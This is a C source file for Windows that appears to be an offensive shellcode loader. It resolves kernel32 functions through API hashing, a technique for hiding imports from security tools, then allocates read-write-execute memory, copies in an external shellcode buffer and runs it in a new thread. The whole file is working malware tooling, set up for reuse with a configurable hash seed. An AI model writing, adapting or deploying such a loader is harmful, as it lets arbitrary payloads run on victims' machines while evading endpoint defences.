#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include "Iat.h"
/*
Externally defined IAT variables:

{
    FARPROC AddrFromHash( HMODULE hLib, uint64_t hashval, uint64_t seed );
}

*/

#include <stdint.h>
#include <stdio.h>
#include <windows.h>

int main( int argc, char * argv[] ) {

    HMODULE hLib = LoadLibraryA( "kernel32.dll" );
    if ( hLib == NULL ) {
        printf( "Failed to load kernel32.dll\n" );
        return 1;
    }

    typedef struct {
        LPVOID( *VirtualAlloc )
        ( LPVOID, SIZE_T, DWORD, DWORD );
        HANDLE( *CreateThread )
        ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
        DWORD( *WaitForSingleObject )
        ( HANDLE, DWORD );
        BOOL( *CloseHandle )
        ( HANDLE );
        BOOL( *VirtualFree )
        ( LPVOID, SIZE_T, DWORD );
    } Overwat;

    /* Change seed if you have a different one, default: 5 */
    uint64_t seed = 5;

    /* Initialize hashed APIs here! */
    uint64_t hashes[] = {
        0x9dbfee6c, 0x6d448ec76, 0xd8670435, 0x2fba412b3, 0xc5f1b0c3 };

    Overwat w;

    /* Begin API resolution */

    w.VirtualAlloc = (LPVOID( * )( LPVOID, SIZE_T, DWORD, DWORD ))AddrFromHash(
        hLib,
        hashes[0],
        seed );

    if ( w.VirtualAlloc == NULL ) {
        printf( "Failed to resolve VirtualAlloc\n" );
        return 1;
    }

    w.CreateThread = (HANDLE( * )( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD ))AddrFromHash(
        hLib,
        hashes[1],
        seed );

    if ( w.CreateThread == NULL ) {
        printf( "Failed to resolve CreateThread\n" );
        return 1;
    }

    w.WaitForSingleObject = (DWORD( * )( HANDLE, DWORD ))AddrFromHash(
        hLib,
        hashes[2],
        seed );

    if ( w.WaitForSingleObject == NULL ) {
        printf( "Failed to resolve WaitForSingleObject\n" );
        return 1;
    }

    w.CloseHandle = (BOOL( * )( HANDLE ))AddrFromHash(
        hLib,
        hashes[3],
        seed );

    if ( w.CloseHandle == NULL ) {
        printf( "Failed to resolve CloseHandle\n" );
        return 1;
    }

    w.VirtualFree = (BOOL( * )( LPVOID, SIZE_T, DWORD ))AddrFromHash(
        hLib,
        hashes[4],
        seed );

    if ( w.VirtualFree == NULL ) {
        printf( "Failed to resolve VirtualFree\n" );
        return 1;
    }

    /* All APIs have been resolved! */
    FreeLibrary( hLib );

    /* Proceed with execution */
    LPVOID pMem = w.VirtualAlloc( NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( pMem == NULL ) {
        printf( "Failed to allocate memory\n" );
        return 1;
    }

    memcpy( pMem, shellcode, shellcode_size );

    HANDLE hThread = w.CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL );
    if ( hThread == NULL ) {
        printf( "Failed to create thread\n" );
        return 1;
    }

    w.WaitForSingleObject( hThread, INFINITE );
    w.CloseHandle( hThread );

    w.VirtualFree( pMem, 0, MEM_RELEASE );

    return 0;
}
